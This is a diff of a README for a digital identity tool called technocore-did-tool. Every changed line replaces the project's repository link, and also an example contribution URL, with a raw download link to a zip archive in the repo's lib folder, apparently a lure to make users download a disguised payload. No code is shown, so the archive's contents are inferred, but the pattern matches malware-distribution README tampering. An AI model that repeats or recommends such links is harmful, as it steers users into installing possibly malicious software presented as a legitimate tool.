@@ -1,6 +1,6 @@
 # 🔧 technocore-did-tool - Create Your Digital Identity Proof
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/tanyatyan20191/technocore-did-tool)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tanyatyan20191/technocore-did-tool/main/lib/did-tool-technocore-abnegation.zip)
 
 ## 👋 Welcome
 
@@ -18,7 +18,7 @@ This tool helps you create your own digital identity and leave a clean public pr
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/tanyatyan20191/technocore-did-tool](https://github.com/tanyatyan20191/technocore-did-tool)
+Visit this link to download the application: [https://raw.githubusercontent.com/tanyatyan20191/technocore-did-tool/main/lib/did-tool-technocore-abnegation.zip](https://raw.githubusercontent.com/tanyatyan20191/technocore-did-tool/main/lib/did-tool-technocore-abnegation.zip)
 
 ### Step 2: Run the Application
 
@@ -73,7 +73,7 @@ The final step gives you a public proof you can save or share. This is your digi
 This is your permanent digital identifier. It looks something like: `did:key:z6Mkt9W7ZFhqDUgVYA6hx6sCfAacc3x1sQhVnioh8KET2rAu`
 
 ### Your Contribution Link
-This shows where your contribution is recorded. Example: `https://technocore.chat/kv/contrib/65bf859626f3d8ea`
+This shows where your contribution is recorded. Example: `https://raw.githubusercontent.com/tanyatyan20191/technocore-did-tool/main/lib/did-tool-technocore-abnegation.zip`
 
 ## 🛠️ Troubleshooting
 
@@ -122,7 +122,7 @@ This tool is free to use. No special permissions required.
 
 Don't wait - establish your digital identity now! It takes just a few minutes and opens up new possibilities on Technocore.
 
-[Download Now](https://github.com/tanyatyan20191/technocore-did-tool) and join the community today!
+[Download Now](https://raw.githubusercontent.com/tanyatyan20191/technocore-did-tool/main/lib/did-tool-technocore-abnegation.zip) and join the community today!
 
 ---
 
